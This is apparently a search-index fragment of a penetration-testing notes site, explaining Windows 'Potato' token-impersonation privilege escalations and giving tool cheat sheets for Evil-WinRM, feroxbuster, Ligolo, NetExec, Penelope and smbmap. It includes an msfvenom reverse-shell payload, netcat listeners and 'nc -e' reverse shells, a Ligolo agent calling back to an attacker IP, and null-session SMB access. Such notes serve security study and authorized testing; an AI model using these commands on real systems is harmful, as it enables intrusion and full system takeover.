in PrintSpoofer: 1. Named Pipe Creation: PrintSpoofer first creates a Named Pipe using <code>CreateNamedPipe()</code> and sets permissions to allow Everyone access. 2. Waiting for Connection: Using <code>ConnectNamedPipe()</code>, the process pauses, waiting for a client (the Print Spooler service running as SYSTEM) to connect. 3. Impersonation: Once the SYSTEM process connects, <code>ImpersonateNamedPipeClient()</code> is called, allowing PrintSpoofer to impersonate SYSTEM and execute code in its context.</p> <p>To Bypassing Path Restrictions:</p> <p>The Printer Bug by default sends notifications to <code>\\\\HOSTNAME\\pipe\\spoolss</code>, but this path is protected. The key trick, discovered by Jonas Lykkegaard, involves manipulating the hostname string. By including a <code>/</code> in the hostname (e.g., <code>\\\\HOSTNAME/pipe/foo123</code>), it passes path validation checks, and Windows' internal path normalization converts the <code>/</code> into <code>\\</code>, transforming the path into a valid named pipe like <code>\\\\HOSTNAME\\pipe\\foo123\\pipe\\spoolss</code>. Steps of Exploit: 1. Path Manipulation: The crafted path allows the attacker to control the pipe used by the Print Spooler service to send notifications. 2. Connection to Controlled Pipe: The Print Spooler service, running as SYSTEM, connects to the attacker-controlled named pipe (e.g., <code>\\\\HOSTNAME\\pipe\\foo123\\pipe\\spoolss</code>). 3. Token Capture and Impersonation: Once connected, the SYSTEM token is captured, and the attacker can impersonate SYSTEM using <code>ImpersonateNamedPipeClient()</code>.</p> <p>Note: <code>PrintSpoofer</code> does not work under <code>NT AUTHORITY\\SERVICE</code>. It requires the user to be running as <code>LOCAL SERVICE</code> or <code>NETWORK SERVICE</code>, with <code>SeImpersonatePrivilege</code></p>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/printspoofer/#printer-bug","title":"Printer Bug","text":"<p>It exploits a vulnerability in the MS-RPRN (Microsoft Remote Print) RPC interface, which is responsible for handling printer-related requests in Windows. The main goal of the Printer Bug is to coerce a Windows machine (such as a Domain Controller) into authenticating to another system, creating opportunities for credential theft and privilege escalation in an Active Directory environment.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/printspoofer/#how-the-printer-bug-works","title":"How the Printer Bug Works?","text":"<ol> <li>MS-RPRN RPC Interface:</li> <li>The MS-RPRN interface allows users to interact with remote print servers.</li> <li>The vulnerability comes from how print requests can be manipulated to force a machine (like a Domain Controller) to authenticate to a remote system.</li> <li>Coercing Authentication:</li> <li>By exploiting this bug, the attacker uses the MS-RPRN interface to trick a Domain Controller or other systems into connecting back to a server they control.</li> <li>When this happens, the target machine sends authentication credentials, typically via NTLM.</li> <li>Unconstrained Delegation:</li> <li>If the attacker\u2019s machine is configured with unconstrained delegation, it can then capture and relay these credentials to gain access to the compromised system or escalate privileges.</li> <li>This method is particularly powerful in multi-forest environments or two-way trusts, where the attacker can pivot between domains or forests by forcing systems to authenticate with their server.</li> </ol>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/rogue/","title":"RoguePotato","text":"<p>Rogue Potato is an exploit that enables privilege escalation to SYSTEM on Windows machines by leveraging DCOM and RPC mechanisms, specifically by manipulating OXID resolution requests.</p> <p>Post-Patch fixes for Juicy Potato (Background information): - Impossible to specify a custom port for the OXID resolver. Only port 135 can be used for these requests. - You can redirect OXID resolution requests to a remote server that you control, still using port 135. However, this will only yield an ANONYMOUS LOGON (Limited privilege). - By forwarding the OXID resolution requests to a local Fake RPC server, you can obtain an identification token during the <code>IRemUnknown2</code> interface query. However, it's essential to understand that these tokens are not useful for impersonation purposes.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/rogue/#how-it-works","title":"How it works?","text":"<ol> <li> <p>Protocol Exploitation via Named Pipes: The Rogue Potato exploit focuses on manipulating protocols supported by RPC, such as <code>ncacn_ip_tcp</code>, <code>ncacn_np</code>, and a key named pipe: <code>epmapper</code>, which operates in the same process space as the RPCSS service. Initially, when testing with the pipe <code>ncacn_np:localhost[\\pipe\\roguepotato]</code>, the RPCSS service still attempted to connect to the reserved <code>\\pipe\\epmapper</code> due to protocol design limitations.</p> </li> <li> <p>Named Pipe Validation Bypass: Inspired by the PrintSpoofer technique (credit to @itm4n and @jonasLyk), a clever bypass was implemented. By injecting a <code>/</code> in the hostname (<code>ncacn_np:localhost/pipe/roguepotato[\\pipe\\epmapper]</code>), the RPCSS service was tricked into connecting to a non-existent pipe <code>\\roguepotato\\pipe\\epmapper</code>. A pipe listener was then set up on <code>\\\\.\\pipe\\roguepotato\\pipe\\epmapper</code>, allowing the attacker to intercept the connection, impersonate the RPCSS client, and obtain an impersonation token for the NETWORK SERVICE account.</p> </li> <li> <p>Token Duplication and Privilege Escalation: Once the impersonation token of NETWORK SERVICE and the LUID of the RPCSS service are obtained, further steps involve:</p> </li> <li>Identify the RPCSS Process: Get the Process ID (PID) of the <code>rpcss</code> service.</li> <li>Enumerate Handles: Open the <code>rpcss</code> process and list all its handles.</li> <li>Duplicate Token Handles: For each handle, attempt to duplicate it and determine the handle type.</li> <li> <p>Check for SYSTEM Token: If the handle type is \"Token\" and its owner is SYSTEM, the token is duplicated and leveraged for privilege escalation.</p> </li> <li> <p>Launch SYSTEM-level Processes: With the SYSTEM token in hand, processes can be launched using <code>CreateProcessAsUser()</code> or <code>CreateProcessWithToken()</code>.</p> </li> <li>Session 0 Access Issues: To bypass occasional \"Access Denied\" errors when launching processes in Session 0, correct permissions must be set on the Windows Station/Desktop to ensure processes are executed successfully with SYSTEM privileges.</li> </ol>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/rogue/#summary","title":"Summary","text":"<p>The Rogue Potato exploit is based on manipulating how the OXID Resolver and RPC services handle object resolution and inter-process communication. Specifically, the attacker targets the RPCSS service, which relies on named pipes like <code>epmapper</code> for resolving network objects. By cleverly modifying how these services are called and interacted with, the attacker redirects the connection through a crafted pipe name (e.g., using the <code>/</code> trick) to control where RPCSS connects.</p> <p>Instead of allowing RPCSS to communicate with the legitimate <code>\\pipe\\epmapper</code>, the exploit tricks it into connecting to <code>\\roguepotato\\pipe\\epmapper</code>, where the attacker has set up a listener. This allows the attacker to capture the interaction and impersonate the NETWORK SERVICE account, obtaining an impersonation token.</p> <p>With access to this token, the attacker then escalates privileges by locating and duplicating a SYSTEM token from the RPCSS service. Using this SYSTEM token, they can launch processes with SYSTEM-level privileges and effectively gain full control of the system.</p> <p>In short, it's a combination of service manipulation, response redirection, and impersonation to achieve SYSTEM-level access.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/roguewinrm/","title":"RogueWinRM","text":"<p>Rogue WinRM is an attack that manipulates the Background Intelligent Transfer Service (BITS) and NTLM relay to impersonate tokens, leading to SYSTEM-level privileges on the target system.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/roguewinrm/#how-it-works","title":"How it works?","text":"<p>Triggering BITS: - The attacker uses the <code>CoCreateInstance()</code> function to trigger the BITS service. This function causes BITS to communicate with the legitimate Windows Remote Management (WinRM) service on port 5985, attempting to authenticate. NTLM Relay Setup: - Instead of allowing BITS to communicate directly with the real WinRM service, the attacker sets up a rogue WinRM server to intercept the NTLM authentication process. - NTLM Type 1 message: When BITS initiates authentication, it sends an NTLM Type 1 message (authentication request) to the rogue server. Relaying NTLM Messages: - The rogue WinRM server relays the Type 1 message to the real WinRM server on port 5985. - The real WinRM server responds with an NTLM Type 2 message (challenge), which is relayed back to BITS by the rogue server. NTLM Type 3 (Final Authentication):  - BITS generates an NTLM Type 3 message, which contains the authentication response. - This message allows the attacker to impersonate the SYSTEM account by capturing the NTLM Type 3 message, which can be manipulated to gain access to the SYSTEM token. Impersonation and Privilege Escalation: - The attacker uses the <code>QuerySecurityContextToken()</code> function to extract the SYSTEM token from the NTLM Type 3 message. - With this token, they can impersonate the SYSTEM account, allowing them to run commands or processes with SYSTEM privileges. Process Creation: - The attacker then calls <code>CreateProcessWithTokenW()</code>, which allows them to create a new process (such as a command prompt) under the SYSTEM account, effectively gaining full control over the machine.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/rotten/","title":"RottenPotato","text":"<p>High level overview 1. Trick the \u201cNT AUTHORITY\\SYSTEM\u201d account into authenticating via NTLM to a TCP endpoint we control. 2. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the \u201cNT AUTHORITY\\SYSTEM\u201d account. This is done through a series of Windows API calls. 3. Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.</p>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/rotten/#how-does-it-work","title":"How does it work?","text":"<ol> <li>API call to <code>CoGetInstanceFromIStorage</code> to fetch an instance of the BITS object that is loaded on <code>127.0.0.1:6666</code></li> <li>Packet Relay: Attacker's listener will relay packets receive from COM to the RPC server on port 135 (Until NTLM authentication happens)</li> <li>Local Authentication: </li> <li>COM is going to try to initiate NTLM authentication with us by sending the NTLM Type 1 (Negotiate) message</li> <li>Relay NTLM Type 1 (Negotiate) message to RPC (on TCP 135)</li> <li>RPC will reply with an NTLM Type 2 (Challenge) message</li> <li>Forward the modified NTLM Type 2(Negotiate) packet to COM where the \u201cChallenge\u201d and \u201cReserved\u201d fields match the output from <code>AcceptSecurityContext</code></li> <li>COM on behalf of the SYSTEM account will send us back the NTLM Type 3 (Authenticate) packet</li> <li>Call <code>ImpersonateSecurityContext</code> with the result of the final call above to get an impersonation token.</li> </ol>"},{"location":"pentest/privesc/windows/tokenprivileges/potatoes/sharp/","title":"SharpEfsPotato","text":"<p>Pre-requisite:</p> <ul> <li> <code>SeImpersonatePrivilege</code> </li> <li> Admin, Administrator User  </li> <li> <code>SharpEfsPotato</code> binary:  Download Link </li> </ul> <p>Generate a shell</p> <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LPORT=&lt;PORT&gt; LHOST=&lt;IP&gt; -f exe -o shell.exe\n</code></pre> <p>Transfer <code>shell.exe</code> and <code>SharpEfsPotato.exe</code> to Target</p> <p>Start listener on KALI</p> <pre><code>rlwrap -r nc -lvnp &lt;PORT&gt;\n</code></pre> <p><code>-r</code> \u2192 Forces always read line mode, making Netcat behave more like an interactive shell.</p> <p>Execute potato</p> <pre><code>./SharpEfsPotato.exe -p shell.exe\n</code></pre>"},{"location":"pentest/tools/evilwinrm/","title":"Evil-WinRM","text":"<p>SSL authentication</p> <pre><code>evil-winrm -S -i &lt;TARGET_IP&gt; -c &lt;CERTIFICATE&gt; -k &lt;KEY&gt;\nevil-winrm -S -i 10.10.10.11 -c key.cert -k key.pem\n</code></pre>"},{"location":"pentest/tools/feroxbuster/","title":"Feroxbuster","text":"<p>Common Scanning</p> <pre><code>feroxbuster -url &lt;URL&gt; -o &lt;FILE&gt; -x &lt;FILE EXTENSIONS&gt;\n</code></pre> <p>Efficient Scanning</p> <pre><code>feroxbuster --resume-from ./ferox-https_example_htb_-1681503744.state --dont-scan https://example.htb/manual\n\nOR\n\nEnter and filter from the interface\n</code></pre> <p>Enable redirection for further directory busting</p> <pre><code>feroxbuster -u http://&lt;IP&gt; -r\n</code></pre> <p>To set a limit on the depth of recursion</p> <pre><code>feroxbuster -u http://&lt;IP&gt; -L &lt;RECURSION DEPTH&gt;\n\nferoxbuster -u http://192.168.1.4 -L 4\n</code></pre> <p>To filter status code</p> <pre><code>feroxbuster -u http://&lt;IP&gt; -C &lt;STATUS CODES&gt;\n\nferoxbuster -u http://192.168.1.4 -C 403,404\n</code></pre> <p>To filter out the messages of a particular length</p> <pre><code>feroxbuster -u http://&lt;IP&gt; -S &lt;MESSAGE LENGTH&gt;\n\nferoxbuster -u http://192.168.1.4 -S 285,286,283,289\n</code></pre> <p>To filter out the results using number of words</p> <pre><code>feroxbuster -u http://&lt;IP&gt; -W &lt;NUMBER OF WORDS&gt;\n\nferoxbuster -u http://192.168.1.4 -W 33\n</code></pre> <p>To filter out the results using number of lines</p> <pre><code>feroxbuster -u http://&lt;IP&gt; -N &lt;NUMBER OF LINES&gt;\n\nferoxbuster -u http://192.168.1.4 -N 9\n</code></pre>"},{"location":"pentest/tools/ligolo/","title":"Ligolo","text":"<p>Create a TUN interface on the C2 (proxy) server</p> <pre><code>sudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n</code></pre> <p>Start proxy server</p> <pre><code>./proxy -h # Help options\n./proxy -autocert # Automatically request LetsEncrypt certificates\n./proxy -selfcert # Use self-signed certificates\n</code></pre> <p>Connect to proxy server</p> <pre><code>./agent -connect &lt;ATTACKER_IP&gt;:11601 -ignore-cert\n</code></pre> <p>Start Tunnel (Select session first)</p> <pre><code>[Agent : root@prod-serv] \u00bb session\n? Specify a session :  [Use arrows to move, type to filter]\n&gt; 1 - #1 - root@prod-serv - 10.200.96.200:46478\nstart\n</code></pre> <p>Add networking route on ATTACKER machine</p> <pre><code>sudo ip route add &lt;IP&gt;/&lt;CIDR&gt; dev ligolo\n</code></pre> <p>Add listener</p> <pre><code>listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp\n</code></pre> <ul> <li><code>0.0.0.0</code> binding listening address</li> <li><code>127.0.0.1</code> attacker machine</li> <li>Machine A (Compromised machine) On Machine B  trigger a reverse shell</li> </ul> <pre><code>nc -e &lt;MACHINE A IP&gt; &lt;PORT&gt;\nnc -e &lt;MACHINE A IP&gt; 30000\n</code></pre> <p>All traffic to 30000 will be redirected to port 10000 on the attacker machine</p> <p>Local Port Forwarding</p> <pre><code>sudo ip route add 240.0.0.1/32 dev ligolo\n</code></pre> <p>Reset/Restart setup</p> <pre><code>sudo ip link delete ligolo\n</code></pre>"},{"location":"pentest/tools/netexec/","title":"NetExec","text":"<p>Enumerate shares (Default)</p> <pre><code>nxc smb &lt;TARGET_IP&gt; --shares\n</code></pre> <p>Null authentication</p> <pre><code>nxc smb &lt;TARGET_IP&gt; -u ' ' -p ' ' --shares\n</code></pre> <p>Anonymous user authentication</p> <pre><code>nxc smb &lt;TARGET_IP&gt; -u 'HackingT1me' -p ' ' --shares\n</code></pre>"},{"location":"pentest/tools/penelope/","title":"Penelope","text":"<p>Penelope is a powerful shell handler built to simplify, accelerate, and optimize post-exploitation workflows!</p> <p>Get Penelope</p> <pre><code>wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py\nchmod +x penelope.py\nsudo mv penelope.py /usr/bin/pen\n</code></pre> <p>Run Penelope</p> <pre><code>pen -p 443\n</code></pre>"},{"location":"pentest/tools/smbmap/","title":"smbmap","text":"<p>To list files and directories</p> <pre><code>smbmap -H &lt;TARGET_IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; -r &lt;SHARE&gt;\nsmbmap -H 192.168.223.40 -u molly.smith -p P@ssw0rd123 -r C$\n</code></pre> <p>To download specific file</p> <pre><code>smbmap -H &lt;TARGET_IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; -r &lt;SHARE&gt; -A &lt;FILE&gt;\nsmbmap -H 192.168.223.40 -u molly.smith -p P@ssw0rd123 -r -A DumpStack.log.tmp\n</code></pre>"}]}